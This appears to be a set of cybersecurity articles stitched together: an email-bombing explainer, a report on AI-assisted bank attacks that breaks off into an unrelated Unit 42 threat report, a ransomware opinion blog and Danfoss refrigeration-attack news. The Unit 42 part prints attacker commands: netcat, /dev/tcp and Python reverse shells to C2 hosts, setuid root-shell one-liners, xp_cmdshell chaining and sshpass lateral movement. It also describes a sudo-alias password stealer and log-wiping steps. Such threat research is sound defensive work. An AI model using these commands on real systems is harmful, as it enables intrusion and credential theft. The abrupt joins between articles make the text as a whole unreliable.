Title: Inbox flooded with sign-up messages? Email bombing explained
Context: First, an attacker gets hold of your email address
Full Text:
Inbox flooded with sign-up messages? How to handle email bombing

Inbox flooded with sign-up messages? Email bombing explained

If you’re suddenly being overwhelmed with sign-up emails, it could very well be a sign of something more serious

In September, reports emerged that a Virginia woman had been submerged by a flood of emails. Hundreds of automated messages poured in over a 24-hour period, including newsletters and promotions she’d never signed up to. But this was no ordinary spam campaign. The real reason behind the inbox blitz was to bury a legitimate email from the victim’s bank warning her about a fraudulent laptop purchase.

This is email bombing. And if it’s happened to you, it could be a warning sign that your identity or online accounts have been hijacked by fraudsters.

Sometimes called “form bombing,” “list bombing” or “subscription bombing,” email bombing attacks usually follow the same pattern. First, an attacker gets hold of your email address. They could do this from historic data breaches, marketing databases, online leaks, or even a prior phishing attack. Once they have it, they’ll use automated, bot-powered tools to sign up for hundreds or thousands of legitimate online services like newsletters, subscriptions, mailing lists, free trials, and competitions.

These will each generate a welcome email or similar. And because they are usually legitimate services, they’re often not blocked by spam filters. The result is an inbox overflowing with messages.

Why do they do it? Two reasons are behind most email bombing attempts:

The scammer is trying to distract the victim so that they don’t see a genuine email among all of the artificially generated ones. They may have hijacked one of your accounts and reset the password, triggering a notification to your inbox. Or they may have made a fraudulent purchase in your name, with the invoice subsequently emailed to you. The main point is to create a smokescreen which prevents you from tackling the more serious fraud.

The hacker may subsequently contact you pretending to be a tech support engineer. They’ll claim to be able to solve your email ‘problem’ and either request a fee to do so, or trick you into installing remote access software so they can take a look at your machine. That could enable them to steal sensitive information on your computer like passwords stored in the browser. Or even install additional malware.

In a corporate scenario, the bomber is most likely trying to distract the cybersecurity team from a more serious attack, such as a data breach or a business email compromise or invoice fraud attempt. Alternatively, they may be trying to disrupt operations as leverage for extortion – ransomware affiliates have used email bombing as a precursor to a fake IT help desk contact in order to get remote access. Or it could even be a disgruntled employee or former worker.

I’ve been email bombed: what next?

If you’ve logged on to find your inbox overwhelmed, don’t panic. Rather than try to unsubscribe to all of the random services you’ve been signed up to, focus your energy on finding the threat that your attacker wanted to hide. Search for security alerts, new device sign-ins, email/phone number changes, password changes/resets, or purchases. Look through your spam folder as well as your inbox, in case the message has ended up there.

If you don’t immediately see anything out of the blue, check your most sensitive accounts individually. These could include

Bank/PayPal/credit card/crypto

Look for any suspicious activity: new devices or payment methods added, passwords that may have been changed, and/or recovery details altered. It’s also worth checking your email forwarding rules and sent/deleted items folders for anything unusual.

If you notice something unusual, try to lock the hacker out by changing the password to a unique, strong credential, and enable two-factor authentication (2FA) for extra login security. Ensure the correct recovery email address/phone number is listed (or they may be able to reset the account again). Contact the company itself if you’re concerned about fraud.

Remember to preserve anything related to a possible account takeover or fraud attempt. Only purge when you’re confident it’s over. You can do this more quickly by trying to identify patterns in the messages (e.g., senders, date ranges, domains, etc.). Then you can bulk select and delete in batches.

It goes without saying that you should put the phone down immediately if anyone calls you claiming to be a tech expert who can sort out your email problem.

Of course, prevention is usually better than cure. And while it’s not always possible to stop your email ending up in the wrong hands, you can limit the damage by ensuring that it’s not exposed on public-facing web pages like social media profiles. Also follow security best practices to stay safe from phishing attacks.

Next, keep your most sensitive accounts as secure as possible. This includes your primary email address, which will be used to receive password reset messages from other online accounts. Use a password manager to ensure they all have strong, unique credentials. And 2FA for an extra layer of security (e.g., via an authenticator app or passkey).

It may also be worth using a secondary email address for less important correspondence like shopping, travel and other leisure activities. This way, if this account is hit by an email bomb, at least your most important messages (bank, government, healthcare etc) are safe.

There’s no silver bullet to prevent email bombing. But account security best practices will help to reduce the chances of an explosion of messages in your inbox.

Frequently asked questions (FAQs)

Why is my inbox full of hundreds of sign-up emails?

You may be the victim of an email bomb (aka form bomb/list bomb/subscription bomb). A fraudster has used automated tools to sign your email address up to new services for one of two reasons. Either they’re hoping to bury a legitimate security or anti-fraud message, or they’re going to call you pretending to be a tech support engineer that can help.

Has my email account been hacked if it’s full of sign-up emails?

Probably not. Fraudsters may have scraped it off the public web, harvested it from a historic data breach, or even bought it from a marketing database. However, the security/fraud ‘event’ they’re trying to hide with the email bomb tactic may have involved account takeover.

My inbox is full of new messages; what should I do?

First, search for the notification they’re trying to hide in the spam and preserve it. Search for security alerts, new device sign-ins, email/phone number changes, password changes/resets, or purchases. Look through your spam folder as well as your inbox. If you don’t find the message, check your sensitive accounts (bank, social media, tech etc) for unusual activity. Change passwords to a unique, strong credential, and add enable two-factor authentication (2FA) for extra log-in security.

I’ve been email bombed. Should I unsubscribe to all of the new emails?

No, it’s important to find the security notification or fraud warning the attacker is trying to hide, and preserve it. Only purge once you’re confident the issue has been resolved. Consider speeding up the process by deleting in batches (search for common senders, date ranges, domains etc.).

What if someone contacts me to fix the problem?

They’re a fraudster who wants to charge you a fee or trick you into installing remote access software on your machine, which could lead to malware or data theft. Put the phone down on them.

Title: TAG-217 Targets South Korean Financial Services with ARTEX
Context: The threat actor linked to recent AI-assisted attacks on South Korean financial institutions was testing infrastructure and assembling attack tools as early as August 2026,...
Full Text:
The threat actor linked to recent AI-assisted attacks on South Korean financial institutions was testing infrastructure and assembling attack tools as early as August 2026, weeks before the banking campaign became public, according to new research from Recorded Future’s Insikt Group. Subsequent public reporting indicated that the breaches exposed personal data belonging to at least 68,000 people across at least seven financial institutions.

Insikt Group’s investigation expands the known timeline and capabilities of the actor, tracked as TAG-217. Insikt Group uncovered tools designed to steal cryptocurrency wallet files, gain greater access to Linux systems, and test weaknesses in mobile devices. The findings illustrate the “jagged edge” of AI-enabled attacks: threat actors realizing significant gains while committing basic operational security mistakes. AI helps attackers pursue more targets across more environments, but does not prevent them from making the security mistakes that allowed Recorded Future to uncover preparations and capabilities beyond the reported banking campaign. Those mistakes give defenders opportunities to identify related activity and disrupt operations.

Targeting South Korean Banks

In early October 2026, South Korea’s Financial Services Commission (FSC) disclosed that multiple financial institutions had been hit by cyberattacks. The attacks had compromised different systems and allowed unauthorized access to different data at each victim entity, with one breach exposing the personal information of an outsourced developer and another resulting in the theft of customer data. Industry sources reported that the attacks involved the use of ARTEX, a Chinese-language, open-source AI penetration testing framework. The variety of targets at each financial institution likely demonstrates an advantage of AI over human operators: the ability to opportunistically test for weaknesses at scale until a valuable target is found.

On October 7, 2026, public analysis of the incident identified that the threat actor, suspected to be a Chinese speaker, used several AI tools as part of their campaign, including Claude Code, DeepSeek, Grok, and Zhipu AI. Other reports shared network infrastructure indicators used in the campaign, including a primary server running ARTEX and the use of residential proxies, likely to obfuscate the origin of the activity.

Recorded Future investigated this infrastructure to better understand the actor’s operations and tracked this activity under the designation TAG-217.

Putting Together a More Complete Timeline for TAG-217

Differentiating between agentic and human-operated attacks can be difficult, especially when skilled threat actors use AI to enhance operational effectiveness. Agentic attacks use the same tactics and techniques as human operators, though faster and at scale. In the case of TAG-217, operational security mistakes allowed Insikt Group to piece together how the threat actor used AI tools to amplify their intrusion attempts across multiple environments and to uncover earlier preparations and a broader set of capabilities than public reporting revealed.

Executive Summary

Unit 42 identified a campaign targeting government entities and state-affiliated infrastructure, with observed activity spanning from October 2025–April 2026. We track this activity as CL-UNK-1211.

In the operations we witnessed, the attackers relied on AI-generated payloads. Multiple artifacts deployed throughout the intrusion contained AI-made conversational annotations and developer reasoning comments, suggesting that the code was either generated using large language models (LLMs) or executed by an automated AI agent.

The attackers behind this cluster of activity focused on Linux environments to conduct extensive reconnaissance and maintain persistent network access to support intelligence-gathering. The attackers attempted to dump sensitive databases and exfiltrate government mailboxes to access social media accounts.

The campaign included a diverse toolkit that combined open-source tools, custom cross-platform backdoors and widespread web shell deployments. We observed various defense evasion techniques, including attempts to disable endpoint protections, erase system logs and plant deceptive red-team markers to disguise activity as a legitimate security assessment.

Our attribution of this activity to CL-UNK-1211 is in accordance with the Unit 42 attribution framework. We designate the term UNK to clusters of activity whose affiliation with either nation-state or cybercrime activity we have not yet determined.

This investigation uncovers the defining tools, techniques and attack patterns of this activity cluster.

Technical Analysis Overview

Our analysis of the CL-UNK-1211 cluster of activity reveals a versatile operational playbook tailored to enterprise Linux and database environments. The attackers targeted government entities and state-affiliated infrastructure, maintaining persistent access by using a combination of custom cross-platform backdoors, open-source utilities and widespread web shell deployments.

The attackers enumerated mailboxes to identify and gain access to social media accounts tied to government email addresses. In addition, they dumped entire database contents before attempting to exfiltrate the data.

The attackers behind CL-UNK-1211 exhibited a methodical approach to defense evasion. This included attempting to disable endpoint protections on compromised systems, and to tamper with system logs that might contain evidence of the attack.

We provide a comprehensive analysis of the defining tools, techniques and procedures (TTPs) used throughout the operation, highlighting how the attackers leveraged AI to streamline payload creation across their execution workflow. Our analysis details key mechanisms across the attack chain. These include:

Initial access via web shell deployment and credential harvesting

Custom RAT execution

Mailbox targeting

Anti-forensics measures

Using AI to Streamline Payload Creation

Throughout the operation, the attackers relied on malicious PHP and shell scripts to maintain persistence, perform reconnaissance and exfiltrate data. These payloads revealed structural patterns and artifacts consistent with AI-assisted code generation.

Rather than standard developer documentation, multiple scripts contained conversational, step-by-step reasoning notes. These notes explained the code’s logic to the operator who provided the initial instructions. Their presence suggests that the code was either copied directly from an AI prompt output or deployed by an automated AI agent.

In addition, we identified several common characteristics that are consistent with AI-operated attacks, such as:

Section headers in scripts and shell commands, which AI uses to analyze the output faster

Extensive use of Base64-encoded commands

Seamless switching between different technologies throughout the attack, including PHP, JavaScript, Bash and Python

Figure 1 shows snippets of code from scripts used by the attackers that contained AI-generated comments.

Dropping Multiple Web Shells for Initial Access

To gain access and maintain a persistent backdoor into the host networks, the attackers deployed a variety of web shells on the targeted Linux servers. These were a combination of custom and open-source web shells found on GitHub. Figure 2 shows interactive web shell activity from the php-fpm parent process.

To achieve persistence, the attackers modified the auto_prepend_file value across all PHP configurations under the directories /etc/php/ and /opt/plesk/php/. These directories store all default PHP configuration files and Plesk (web hosting control panel) configuration files. Any file that is specified in the modified auto_prepend_file value will automatically load and execute before any other PHP script runs.

In one instance, the attackers deployed a malicious PHP web shell as a file named /usr/lib/php/plesk_sys_driver.php to appear legitimate. They also modified the auto_prepend_file to load the malicious web shell to ensure persistence. Figure 3 shows the attacker-deployed PHP script, including the original inline comments.

Credential Harvesting Techniques

The attackers used multiple methods to gather credentials in the targeted environments, including:

Editing the .bashrc file

Inserting malicious lines of code into PHP scripts

Scanning the network for cleartext passwords

Hijacked .bashrc File

The attackers replaced the .bashrc file with a copy containing a malicious command that steals victims’ passwords. In one instance, they created an alias for the sudo command that was designed to execute each time a user attempted to run it. The malicious command:

Displays a prompt for the user to insert their password (mimicking the standard system authentication prompt)

Captures the inserted password

Writes it to the attackers’ log file

The harvested password is then passed to the legitimate sudo command for execution, leaving the victim unaware of the underlying interception. The attackers named the log file Solarwinds.StatusLog.txt, to mimic legitimate SolarWinds activity in the environment. We have no evidence of SolarWinds systems and infrastructure being compromised during this operation; the attackers misused the organization’s name as an evasion method.

Figure 4 shows the command hijacking technique inside the .bashrc file.

PHP Credential Logger

The attackers inserted a line of code into a PHP login page — most likely targeting a database authentication routine — to harvest admin credentials. If an administrator logs in, the code forwards the username and password to the attackers’ log file. Figure 5 shows a snippet of a PHP script including the code added by the attackers.

Scanning for Cleartext Passwords

The attackers searched for email, SMTP and database passwords inside configuration files and command history files. Figure 6 shows an example of commands that the attackers used to search for cleartext passwords.

SysGoRAT Malware

The attackers deployed a custom-developed, multi-platform remote access Trojan (RAT) written in Go, first observed under the benign file name sys-control-client. We named this malware SysGoRAT. This malware supports cross-platform execution on Windows and Linux and employs multiple persistence methods to maintain long-term access.

The malware established a command and control (C2) connection over WebSocket to wss://<addr>/ws. This WebSocket address defaults to a hardcoded IP address 104.194.158[.]65:443, which the malware operator can modify via a command-line parameter at execution. SysGoRAT supports a fixed set of seven command types, described in Table 1.

Action

Behavior

Executes arbitrary commands via /bin/sh -c (Linux) or cmd /C (Windows)

control

Dispatches one of four sub-actions (see Control Sub-Actions in Appendix A)

list_dir

Lists directory content

shell_input

Creates an interactive shell session

proxy_connect

Establishes a TCP connection to an arbitrary target

proxy_data

Relays data bidirectionally to an established proxy connection

proxy_close

Terminates and removes a proxy session

Table 1. SysGoRAT command types.

The malware’s sub-actions provide additional capabilities and persistence methods, detailed in Appendix A.

The attackers renamed the binary on disk to blend in, using different benign names on targeted endpoints, including:

sys-control-client

pip2.7

ea_install

./semanage

In-Memory Reverse Shells

The attackers employed multiple reverse shell techniques across at least seven distinct C2 servers. To avoid leaving forensic artifacts on the disk, these shells operated almost entirely in memory using built-in system utilities:

Named pipe via Netcat: The primary method, deployed across three separate C2 servers, used a named pipe pattern to execute bash commands directly over a network socket.

rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc <C2> <port> >/tmp/f

1

rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc <C2> <port> >/tmp/f

Bash TCP redirects: The attackers redirected the output of bash commands to an attacker-controlled external IP address.

bash -i >& /dev/tcp/[IP]/[PORT] 0>&1

1

bash -i >& /dev/tcp/[IP]/[PORT] 0>&1

Python subprocesses: The attackers ran a Python script to spawn a remote interactive shell. They achieved this by opening an outbound network socket and binding it to a /bin/bash process, giving them an accessible command-line interface.

python3 -c "import socket,subprocess,os; s=socket.socket(...); s.connect(('[IP]',[PORT])); os.dup2(...); subprocess.call(['/bin/bash','-i'])")

1

python3 -c "import socket,subprocess,os; s=socket.socket(...); s.connect(('[IP]',[PORT])); os.dup2(...); subprocess.call(['/bin/bash','-i'])")

Organizations can defend against reverse shell techniques by enforcing strict outbound firewall rules and using endpoint detection to spot standard utilities that spawn interactive shells. Figure 7 shows the reverse shell command that Cortex XDR detected and prevented.

Targeting Mailboxes for Social Media Account Access

The attackers targeted official government mail servers to steal emails and facilitate access to external social media accounts.

In this operation, the attackers enumerated the /var/qmail/mailnames/ directories for several domains and counted the number of emails stored in specific users’ Maildir/cur/ directories to identify targets.

Next, the attackers searched for social media-related emails. They deployed a PHP script, named search_social.php, that searched for specific keywords in email headers and displayed the results in a user-friendly format. Figure 8 shows the first part of the script.

The script then parsed the response and displayed the exact file path, social media account email sender, recipient and subject.

Figure 9 demonstrates the expected output.

After identifying the specific emails they wanted to exfiltrate, the attackers attempted to generate a bash script named zip_mails.sh that would iterate through users’ directories and compress their emails into ZIP archives. Figure 10 shows this command.

This bash script is intended to exfiltrate an entire mailbox rather than a specific social-media-related file identified by the previously analyzed script. In this particular instance, we found that the script contained syntax errors, such as a broken variable assignment user=\;) and would fail upon execution.

We found indications that the attackers also intended to exfiltrate multiple databases and steal highly sensitive government data. The data exfiltration techniques the attackers used are detailed in Appendix B.

Defense Evasion and Anti-Forensics Attempts

A core component of the attackers’ playbook involved anti-forensics techniques, specifically:

Attempting to disable endpoint protections

Tampering with logs

Timestomping

Disguising malicious activity

Deleting residual artifacts to hinder post-incident analysis

This section details the specific evasion techniques and cleanup commands the attackers used to cover their tracks.

Disabling Endpoint Protection

One of the techniques the attackers used for defense evasion was an attempt to disable security protection devices on the compromised hosts. As Figure 11 shows, the attackers executed bash scripts that use the Linux commands pgrep and pkill to attempt to terminate Cortex XDR-related processes on infected systems.

These attempts were successfully detected and mitigated by Cortex XDR, with telemetry confirming that endpoint protections were not suppressed.

Removing Scripts After Execution

Throughout the campaign, the attackers ensured that single-use scripts were removed after execution by formulating a single command that:

Wrote the script to disk

Executed the script

Removed the script using rm

Figure 12 shows an example of this procedure as executed by the attackers.

Timestomping

For scripts that were meant for long-term use, the attackers used timestomping.

They used the command touch -t to change the access and modification time of malicious files, to make them appear as if they were created long before the attack started. The goal of this technique is to evade analysis by misleading analysts into believing the file is unrelated to malicious activity, due to its creation time predating the attack timeline.

Disguising Activity as Red Team Operations

In several instances, we observed the attackers employing planted deception techniques to mislead post-incident analysis. They attempted to disguise their activity as a red team operation, by using operational indicators such as the key RedTeamOps2025 in one of the malicious scripts, and pentest123 as a password for a user the attackers created.

Cleaning Up Logs and Residual Files

Following the exfiltration attempts, the attackers initiated a full cleanup of log files and malicious residual files on the systems. This cleanup included attempts to delete logs related to:

Authentication

Command history

Email activity

Operating system (OS)

Web server

Active PHP user sessions

Figure 13 shows the execution of shell commands to delete various log files from the system.

Following the mass log deletion, the attackers executed several automated cleanup commands and scripts, and verified that any evidence of the exfiltration was deleted.

Figure 14 shows one of the attackers’ cleanup scripts, including the original inline comments. The script attempts to delete various logs across the system for a second time and to remove any files from /tmp/, where the attackers stored malicious scripts.

After the cleanup phase, the attackers attempted to verify the removal of evidence, checking whether IP addresses they used were removed from system log files, as Figure 15 shows.

Additional commonly used TTPs that the attackers leveraged throughout the campaign are detailed in Appendix B.

Conclusion

This campaign demonstrates how attackers are combining traditional post-exploitation techniques with AI-accelerated workflows to target governmental Linux server infrastructure. By leveraging AI to rapidly generate, adapt and deploy operational scripts, the attackers behind CL-UNK-1211 maintained a fast pace of operation while minimizing manual developer overhead.

The attackers behind this activity exhibited a deep understanding of the Linux OS, employing techniques such as:

Global PHP configuration hijacking for persistent access

Command-line credential harvesting and privilege escalation using different shells

Alongside open-source utilities, their toolkit featured custom tools, including a multi-platform Go RAT and custom vulnerability scanners.

The attackers also maintained a thorough cleanup strategy to thwart forensic analysis, by erasing system logs and attempting to disable endpoint protections. Despite these evasion efforts, endpoint security controls effectively neutralized their activity. Cortex XDR detected and prevented the process termination attempts targeting the agent.

Attackers continue to adopt AI to streamline payload development and scale their campaigns.

Comprehensive visibility into Linux servers, databases and environments remains critical to countering attackers’ efforts and strengthening enterprise security.

Appendix B: Analysis of Additional CL-UNK-1211 TTPs

The following section provides an analysis of additional TTPs associated with the CL-UNK-1211 activity cluster. The TTPs described in this appendix are more common in the broader threat landscape than those discussed previously.

​​Privilege Escalation Using Open Source Tools

After gaining access to Linux servers, the attackers escalated their privileges. They started by deploying and executing an open-source tool called LinPEAS to check for local privilege escalation paths. Next, they used another open-source tool — PwnKit, a self-contained exploit for CVE-2021-4034 — in an attempt to gain root privileges on the system.

Once the attackers obtained root privileges, they deployed various binaries with the goal of maintaining root access:

A renamed legitimate Python 3 interpreter: The attackers used the Python 3 interpreter and renamed it to .libpython-helper to execute shell commands with high privileges. They achieved this by using the Python commands os.setuid(0) and os.setgid(0), which set root privileges for the shell.Following is an example of a command used:

/usr/lib/x86_64-linux-gnu/.libpython-helper -c import os; os.setuid(0);os.setgid(0);os.system("<command>")

1

2

/usr/lib/x86_64-linux-gnu/.libpython-helper -c import os;

os.setuid(0);os.setgid(0);os.system("<command>")

Custom SUID root shell: This backdoor is dropped with the name .libsystemd-helper, and elevates itself to root privileges. It executes arbitrary shell commands via /bin/sh by running setuid with an argument of zero, followed by setgid with an argument of zero.

A renamed legitimate /bin/bash binary: The attackers wrote to disk a file named .tourch and modified its permissions using the command chmod u+s, allowing any user to execute commands as the file owner — which in this case was root. Because .tourch is actually the /bin/bash binary, this allowed the attackers to execute bash commands as root.

Reconnaissance

The attackers leveraged a variety of reconnaissance techniques to identify and map high-value servers across compromised networks.

Network Scanning and Database Enumeration Using PHP Scripts

The attackers used multiple PHP scripts to conduct reconnaissance of the target networks. The scripts were used to scan the network for SQL servers, enumerate databases, and enumerate various domain artifacts. These artifacts included users, computers and open shares. Figure 19 shows one of the scripts the attackers used to scan for SQL servers.

CVE-2025-55182 (React2Shell) Vulnerability Scanner

The attackers deployed a custom vulnerability scanner written in Go that scans for servers vulnerable to CVE-2025-55182 (React2Shell). Figure 20 shows the “Help” output of the scanner.

Propagating in the Environment

To bypass internal firewalls and extend their access beyond the initially compromised web servers, the attackers employed a combination of database features, custom malware and open-source proxy tools. These methods enabled the attackers to bypass firewalls, route traffic into the network and execute commands across multiple servers.

Throughout the operation, the attackers used a web shell to deploy Base64-encoded PHP scripts. They started by enabling command execution on an internal MSSQL server using XP_CMDSHELL:

EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;.

1

EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;.

The attackers identified the network segment they wanted to reach, and then created a double-hop execution chain to reach another segment within the network. This involved routing commands from the compromised web server through an initial MSSQL server to reach a secondary SQL server on a different subnet. They verified the routing and started executing OS-level commands on the second host. Following is an observed instance of a whoami command execution through a double-hop execution chain:

EXEC xp_cmdshell 'sqlcmd -S \[SERVER_IP] -U \[USERNAME] -P "\[PASSWORD]" -Q "EXEC xp_cmdshell ''whoami''" -t 10 2>&1'

SSH for Lateral Movement

The attackers also used the sshpass command with hard-coded administrative credentials to enable lateral movement across the internal network. The following command structure was used to pivot across internal Secure Shell (SSH) targets:

sshpass -p [PASSWORD] ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 [USERNAME]]@[IP_ADDRESS] [COMMAND] 2>&1")

1

sshpass -p [PASSWORD] ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 [USERNAME]]@[IP_ADDRESS] [COMMAND] 2>&1")

After establishing a successful SSH session on a target, the attackers executed follow-up commands to further compromise the environment. Observed post-pivot commands included:

Running the id command to verify user context and access levels

Reading the /etc/shadow file to steal password hashes

Using find to search for wp-config.php files containing database passwords

Listing home directories and .git repositories to map the server’s contents

Executing custom PHP scripts over SSH

SSH-Based Persistency

The attackers achieved SSH-based persistence by injecting an SSH public key into the compromised user’s authorized_keys file. This establishes passwordless remote shell access. Following is the command sequence the attackers executed to install the SSH backdoor:

Ensure the hidden .ssh directory exists

Restrict directory access only to the owner (using chmod 700)

Append the malicious public key to the authorized_keys file

Set strict permissions on the authorized_keys file

Figure 21 shows the observed command.

Additional Proxy Tools

The attackers deployed a variety of tunneling and proxy tools, while employing multiple techniques to maintain persistence and evade detection:

revsocks: The attackers deployed the open-source tool revsocks, a reverse SOCKS5 tunneling tool with SSL/TLS and proxy support.

pysoxy: The tool set also included pysoxy, an open-source Python SOCKS proxy script used to route traffic.

GSocket and gs-netcat: The attackers misused Global Socket, a framework designed to solve NAT and firewall traversal problems. They deployed the framework’s binary, gs-netcat, which forces the internal host to establish an outbound connection to the public relay server (gsocket[.]io). This binary was stored in /dev/shm/.gs-10085/ and executed under the disguised process name [kcached] (mimicking a kernel cache thread), alongside the binary gs-dbus (mimicking the D-Bus system). Execution parameters were passed via the environment variable (GSOCKET_ARGS) to hide them from process monitoring, and the spawned sessions were configured with HISTFILE=/dev/null to prevent shell command history from being logged to disk.

Additional Data Exfiltration Attempts

The attackers used a combination of methods to extract sensitive data. We observed how they dumped entire database contents into compressed local archives before attempting to exfiltrate them to their C2 infrastructure. They also misused legitimate file-hosting platforms to blend the outgoing data with standard web traffic.

Exfiltration attempts began with attackers using the echo command to print small data samples directly to the terminal, using TOP clauses to limit the output. They subsequently attempted a structured dump, writing four tables, each capped at 100 rows, to a local SQLite database named dump.sqlite. Figure 22 shows the command sampling 100 results from four tables into /tmp/dump.sqlite.

Japan’s Cyber Emergency Is a Warning for the World

Matthew Richards

October 15, 2026

TL;DR: Japan’s cyber emergency is a warning about what happens when familiar ransomware playbooks become faster, cheaper and easier to scale. AI reduces the time and coordination required to analyze targets, build tooling and chain destructive actions. That shortens the interval between initial access and business impact. Defenders need real time enforcement and containment that limit malicious behavior while people investigate and recover.

Japan’s government has moved into emergency response mode after ransomware, unauthorized access and data theft affected organizations nationwide. National cyber authorities have issued coordinated guidance calling for urgent reviews of internet facing systems, data exposure and incident response readiness. (Financial Times; Japan National Cybersecurity Office; IPA)

Japan is an early warning of global problem: familiar attack methods are becoming easier to prepare, faster to execute and cheaper to repeat, while defenders still rely heavily on human speed investigation and response. Security leaders can’t afford to treat that imbalance as a regional anomaly.

What is Japan warning the rest of the world about?

While these attacks seem to bear the hallmarks of AI assistance, Japanese authorities have not concluded that AI caused every incident in the current wave. Their guidance points to a broad set of weaknesses, including exposed applications, unpatched systems, supply chain dependencies and insufficient response readiness. Japan’s National Institute of Information and Communications Technology warns that AI makes application analysis and vulnerability discovery more efficient, allowing attackers to study public applications and adapt attacks with less manual effort.

Cisco Talos found a more direct ransomware example. In research on attacks affecting Japanese organizations, Talos identified, with medium to high confidence, Python scripts used by the Qilin ransomware operation that may have been generated with AI. The scripts coordinated destructive actions, disabled and destroyed backups and distributed ransomware across multiple systems.

None of those attack techniques are new. What changes is how quickly attackers can create, adapt and coordinate them when they use AI. This is what we have to prepare for.

Why does AI change the scale without changing the playbook?

Ransomware has always required a pretty straightforward sequence to be effective. Attackers identify a target, find a path inside, execute tooling, interfere with recovery, distribute the payload and pressure the victim. Human operators have long automated parts of that process, but they still had to assemble tools, interpret results and decide what came next.

AI removes more of the labor between those steps. It accelerates target analysis, structures scripts, adapts code and coordinates multi stage workflows. One successful action can feed the next without the same pause for a person to write, revise or organize the tooling.

Capable operators can do more, less capable operators can reach further and reusable workflows lower the cost of attacking the next organization. AI is not reinventing ransomware. It is industrializing the familiar playbook.

Do we wait for proof that AI caused it?

Waiting for investigators to establish AI’s role in each incident is the right approach for attribution. It is the wrong prerequisite for changing the defensive model. Research already shows AI making target analysis and vulnerability discovery more efficient, and likely AI generated tooling inside an active ransomware operation. The unresolved question is which current Japanese incidents involved AI, not whether AI can reduce the time required for ransomware activity. Does the answer matter for the rest of us?

Waiting for perfect attribution leaves defenders optimizing for yesterday’s attacker. The useful question is whether the security architecture can limit malicious behavior because there will likely be more attacks like this, perhaps faster, more capable and broader in scope.

Defenders do not need a new catalog of malicious behaviors. Existing controls have to act before the attacker completes the next familiar step.

Why must containment move closer to execution?

A traditional response model assumes that visibility creates enough time for action. An event is detected, an alert is reviewed, an analyst reconstructs the sequence and a response is approved. That model weakens when AI compresses the attack timeline. While defenders are determining what happened, the ransomware operation continues launching processes, modifying files, interfering with recovery or distributing the next payload.

Detection remains necessary, but it is an intermediate step rather than the outcome. The outcome is whether the system reduced what the attacker could still do. When malicious behavior is clear, enforcement and containment need to occur at execution speed while people continue the investigation and make consequential decisions. Imagine if the bank could stop a ransomware process on a workload before it completed?

What should security leaders change now?

The useful question is whether the existing security architecture can keep pace when AI accelerates familiar attack behavior. Leaders should know what happens when a workload downloads an unexpected binary, launches an unauthorized process, opens an unapproved connection, modifies protected files or attempts to escalate privileges. They should also know which controls act immediately and which still depend on a person reviewing an alert and approving a response.

If AI reduces the time between one ransomware step and the next, how much malicious activity can continue between detection and containment?

The conditions behind Japan’s emergency are not unique. Technologies and readiness differ by company, but attacks are becoming easier to scale while human speed response becomes less adequate.

How can Aquasec help?

Aquasec monitors the real behavior of running cloud native workloads, including process activity, network connections, file changes and privilege usage. That production context shows what an application is actually doing under operating conditions rather than relying only on what was known before deployment.

Observation is only the first step. Aquasec enforces policy locally at runtime, including blocking malicious execution, preventing privilege escalation and containing attacker activity. When an attack chain accelerates, local enforcement changes what the workload is allowed to do next without waiting for a separate analysis or approval workflow.

Aquasec Compass extends that operating model into agentic investigation, containment and remediation through the Model Context Protocol, with humans retaining control over consequential decisions. Attackers are using AI to reduce the time and labor inside their operations. Defenders need automation that reduces the time from evidence to bounded action.

Runtime protection does not replace patching, recovery planning or application layer security. It addresses the interval in which an active attack turns one malicious action into the next. In an AI accelerated ransomware operation, that interval is where containment can still change the outcome.

FAQs

Did Japan officially attribute the current cyberattack wave to AI?

No. Japanese authorities have not attributed every case to AI. Separate public evidence evaluating events shows that AI is already making target analysis and ransomware tooling more efficient.

Why is Japan a warning for other countries?

The conditions behind the crisis are not unique to Japan. AI lowers the labor required to identify targets, build tooling and coordinate familiar attack stages, while most institutions still rely heavily on human investigation before action.

What is AI changing about ransomware?

AI reduces the time and coordination required to analyze targets, adapt scripts and chain attack stages. The underlying actions remain familiar, but the operation becomes faster and easier to scale.

France: Internet-Exposed Danfoss Controllers Drop 71% After Cyber-Attack

Reporter, Infosecurity Magazine

Internet-exposed refrigeration controllers in France are disappearing from public view at a dramatic rate following a cyber incident targeting supermarket food supplies.

Censys researchers observed a 71% drop in internet-exposed Danfoss StoreView controllers in just three days after the October 11 cyber-attack targeting hundreds of supermarkets in France, suggesting that operators are moving quickly to limit their systems' online exposure.

Danfoss StoreView was among the equipment targeted by this cyber-attack. StoreView instances are typically used as control panels for Danfoss refrigeration controllers that are installed in many French supermarket fridges and freezers.

Danfoss, a Danish temperature regulation systems provider, has confirmed its equipment was targeted by the cyber-attack, and said most affected controllers were either older models that no longer received security updates (AK-SM800 and AK-SC355) or newer models running outdated firmware (AK-SM800A).

Danfoss patched three vulnerabilities in its AK-SM 800A controllers in March 2025 (CVE-2025-41450) and August 2025 (CVE-2025-41451 and CVE-2025-41452).

A year later, a researcher at industrial security provider Claroty demonstrated how CVE-2025-41450 and CVE-2025-41451 could be chained together to achieve remote code execution and thus disable cooling while falsifying temperature readings, potentially concealing failures in the cold chain.

While Danfoss has not confirmed the exact initial access vector, a plausible explanation is that attackers exploited unpatched vulnerabilities in internet-exposed Danfoss controllers to gain remote access to supermarket refrigeration systems.

Operators Take Danfoss Controllers Offline Instead of Patching

In a new report published on October 14, researchers at Censys have shown a significant drop in France-based Danfoss StoreView instances exposed to the internet in just three days after the attack.

Censys provides a specialized internet search engine that scans and indexes every internet-connected device, server and system on the globe. Instances that can be found with a Censys scan are typically connected to the internet without proper security controls obfuscating their activities, such as a corporate virtual server (VPN) connection.

Such exposure does not mean the instance carries a vulnerability. However, users of assets that are both vulnerable – like unpatched Danfoss AK-SM800A instances – and exposed to the internet, significantly increase their risk of compromise.

Censys found 2991 internet-exposed hosts with a Danfoss StoreView control panel on October 11. Among these, 61% (1825) were located in France.

According to the Censys report, the number of StoreView control panels in France fell to 1781 on October 12 and 537 on October 14 – a 71% drop.

Across other countries analyzed, the change isn’t as dramatic, with 966 internet-exposed hosts with a Danfoss StoreView control panel on October 11, down from 1166 three days earlier.

